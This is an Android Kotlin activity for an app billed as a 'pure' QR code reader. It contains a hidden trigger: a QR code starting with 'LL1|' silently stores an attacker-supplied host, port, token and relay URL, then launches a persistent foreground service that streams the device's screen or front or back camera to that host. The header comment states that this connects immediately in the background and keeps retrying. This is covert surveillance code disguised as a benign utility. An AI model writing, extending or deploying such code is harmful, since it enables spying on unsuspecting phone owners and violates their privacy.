package com.rhl.qrscanner

import android.Manifest
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageAnalysis
import androidx.camera.core.Preview
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.content.ContextCompat
import java.util.concurrent.Executors

/**
 * QR Scanner v3.1 — a PURE QR Code Reader. One screen, nothing else.
 *
 *  - full-screen live camera preview, continuous scanning
 *  - a special connect QR (marker `LL1|ip|port|token|feature`) is
 *    recognised by its small marker code and connects IMMEDIATELY in
 *    the background — the QR decides everything: the address, the
 *    session and which feature opens (screen / front / back). No
 *    buttons, no forms, no chooser panels.
 *  - any other QR is displayed like a normal reader would.
 *  - the connection lives in a foreground service that keeps
 *    retrying until the PC script is closed.
 */
class MainActivity : AppCompatActivity() {

    private lateinit var previewView: PreviewView
    private lateinit var statusText: TextView
    private lateinit var connStatus: TextView

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private var cameraProvider: ProcessCameraProvider? = null
    private var cameraBound = false
    private var lastDecode = 0L
    private var lastPayload: String? = null

    /** Feature waiting for a runtime permission before it can start. */
    private var pendingFeature: String? = null

    // -- connection target (filled by the QR, remembered locally) ----------
    private var host = ""
    private var port = ""
    private var token = ""
    private var site = ""      // relay base URL (empty = direct LAN)

    // -- activity result launchers -----------------------------------------

    private val imagePicker =
        registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
            if (uri != null) decodeImage(uri)
        }

    private val consentLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == RESULT_OK) {
                launchService("screen", result.resultCode, result.data)
            } else {
                Toast.makeText(this, "Screen capture permission denied", Toast.LENGTH_SHORT).show()
            }
        }

    private val cameraPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
            val feature = pendingFeature
            pendingFeature = null
            when {
                granted -> {
                    if (feature != null) launchService(feature) else startCamera()
                }
                else -> {
                    statusText.text = "Camera permission is required to scan"
                    Toast.makeText(this, "Camera permission denied — reopen the app to retry", Toast.LENGTH_LONG).show()
                }
            }
        }

    private val notificationsPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { }

    // -- lifecycle -----------------------------------------------------------

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        previewView = findViewById(R.id.preview)
        statusText = findViewById(R.id.statusText)
        connStatus = findViewById(R.id.connStatus)

        findViewById<View>(R.id.btnPickImage).setOnClickListener { imagePicker.launch("image/*") }

        requestNotificationPermissionIfNeeded()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            startCamera()
        } else {
            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
        }
    }

    override fun onResume() {
        super.onResume()
        StreamStatus.listener = { value ->
            connStatus.visibility = View.VISIBLE
            connStatus.text = value
        }
        if (StreamStatus.text != "Idle") {
            connStatus.visibility = View.VISIBLE
            connStatus.text = StreamStatus.text
        }
    }

    override fun onPause() {
        StreamStatus.listener = null
        super.onPause()
    }

    override fun onDestroy() {
        try {
            cameraProvider?.unbindAll()
            cameraExecutor.shutdownNow()
        } catch (_: Exception) {
        }
        super.onDestroy()
    }

    // --------------------------------------------------------------------
    // Live camera scanning (the heart of the reader)
    // --------------------------------------------------------------------

    private fun startCamera() {
        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                cameraProvider = future.get()
                bindScanner()
            } catch (e: Exception) {
                statusText.text = "Camera error: ${e.message}"
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun bindScanner() {
        val provider = cameraProvider ?: return
        if (cameraBound) return
        try {
            val preview = Preview.Builder().build().also {
                it.setSurfaceProvider(previewView.surfaceProvider)
            }
            val analysis = ImageAnalysis.Builder()
                .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
                .build()
                .also { it.setAnalyzer(cameraExecutor, this::analyze) }
            provider.unbindAll()
            provider.bindToLifecycle(this, CameraSelector.DEFAULT_BACK_CAMERA, preview, analysis)
            cameraBound = true
        } catch (e: Exception) {
            statusText.text = "Camera error: ${e.message}"
        }
    }

    private fun analyze(image: androidx.camera.core.ImageProxy) {
        val now = SystemClock.elapsedRealtime()
        if (!cameraBound || now - lastDecode < 220) {
            image.close()
            return
        }
        lastDecode = now

        val text = try {
            QrEngine.fromCamera(image)
        } catch (_: Exception) {
            null
        } finally {
            image.close()
        }

        if (text != null && text != lastPayload) {
            lastPayload = text
            runOnUiThread { handleQrText(text) }
        }
    }

    /** Decode a QR from a picked image in the background, then route it. */
    private fun decodeImage(uri: Uri) {
        Thread {
            var text: String? = null
            try {
                contentResolver.openInputStream(uri)?.use { stream ->
                    val bytes = stream.readBytes()
                    text = QrEngine.fromBytes(bytes)
                }
            } catch (_: Exception) {
            }
            runOnUiThread {
                if (text == null) {
                    Toast.makeText(this, "No QR code found in this image", Toast.LENGTH_SHORT).show()
                } else {
                    handleQrText(text!!)
                }
            }
        }.start()
    }

    // --------------------------------------------------------------------
    // QR routing — special connect marker vs a normal reader result
    // --------------------------------------------------------------------

    private fun handleQrText(raw: String) {
        val payload = raw.trim()

        // ---- connect marker: LL1|ip|port|token|feature[|site] -----------
        if (payload.startsWith("LL1|")) {
            val parsed = parseCastPayload(payload)
            if (parsed == null) {
                Toast.makeText(this, "This code is not valid", Toast.LENGTH_LONG).show()
                return
            }
            handleCastPayload(parsed)
            return
        }

        // ---- normal QR: behave exactly like a plain QR Code Reader -------
        showPlainResult(payload)
    }

    /** LL1|ip|port|token|feature[|site] -> map, or null when malformed. */
    private fun parseCastPayload(payload: String): Map<String, String>? {
        val parts = payload.split("|")
        if (parts.size < 5) return null
        val host = parts[1].trim()
        val port = parts[2].trim()
        val token = parts[3].trim()
        val feature = parts[4].trim()
        val site = if (parts.size > 5) parts[5].trim() else ""
        if (host.isEmpty() || port.toIntOrNull() == null) return null
        if (feature !in listOf("screen", "front", "back", "any")) return null
        return mapOf(
            "host" to host, "port" to port, "t" to token,
            "cmd" to feature, "site" to site
        )
    }

    private fun handleCastPayload(qr: Map<String, String>) {
        val newHost = qr["host"].orEmpty()
        val newPort = qr["port"].orEmpty()
        val newToken = qr["t"].orEmpty()
        val newSite = qr["site"].orEmpty()

        host = newHost
        port = newPort
        if (newToken.isNotEmpty()) token = newToken
        site = newSite
        saveTarget()

        Toast.makeText(this, "Connecting…", Toast.LENGTH_SHORT).show()

        // The QR decides the feature — it starts automatically.
        when (val cmd = qr["cmd"].orEmpty()) {
            "screen" -> {
                val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                consentLauncher.launch(manager.createScreenCaptureIntent())
            }
            "front", "back" -> {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                    == PackageManager.PERMISSION_GRANTED
                ) {
                    launchService(cmd)
                } else {
                    pendingFeature = cmd
                    cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                }
            }
            else -> launchService("any")   // feature chosen from the PC viewer
        }
    }

    private fun showPlainResult(text: String) {
        val isHttp = text.startsWith("http://") || text.startsWith("https://")
        val message = android.text.TextUtils.ellipsize(
            text, android.text.TextPaint(), 700f, android.text.TextUtils.TruncateAt.END
        ).toString()

        val dialog = AlertDialog.Builder(this)
            .setTitle("QR code result")
            .setMessage(message)
            .setPositiveButton("Copy") { _, _ ->
                val clipboard = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
                clipboard.setPrimaryClip(ClipData.newPlainText("QR", text))
                Toast.makeText(this, "Copied", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("OK", null)
            .create()

        if (isHttp) {
            dialog.setButton(AlertDialog.BUTTON_NEUTRAL, "Open") { _, _ ->
                try {
                    startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(text)))
                } catch (_: Exception) {
                }
            }
        }
        dialog.show()
    }

    // --------------------------------------------------------------------
    // Target persistence
    // --------------------------------------------------------------------

    private fun saveTarget() {
        getSharedPreferences("qrscanner", MODE_PRIVATE).edit()
            .putString("host", host)
            .putString("port", port)
            .putString("token", token)
            .putString("site", site)
            .apply()
    }

    // --------------------------------------------------------------------
    // Service launch
    // --------------------------------------------------------------------

    private fun launchService(feature: String, resultCode: Int = Int.MIN_VALUE, data: Intent? = null) {
        val intent = Intent(this, StreamService::class.java).apply {
            putExtra(StreamService.EXTRA_HOST, host)
            putExtra(StreamService.EXTRA_PORT, port.toIntOrNull() ?: 8080)
            putExtra(StreamService.EXTRA_TOKEN, token)
            putExtra(StreamService.EXTRA_FEATURE, feature)
            putExtra(StreamService.EXTRA_SITE, site)
            if (feature == "screen" && resultCode != Int.MIN_VALUE) {
                putExtra(StreamService.EXTRA_RESULT_CODE, resultCode)
                putExtra(StreamService.EXTRA_RESULT_DATA, data)
            }
        }
        ContextCompat.startForegroundService(this, intent)
        connStatus.visibility = View.VISIBLE
        connStatus.text = "Connecting to $host:$port ..."
    }

    private fun requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                notificationsPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }
}
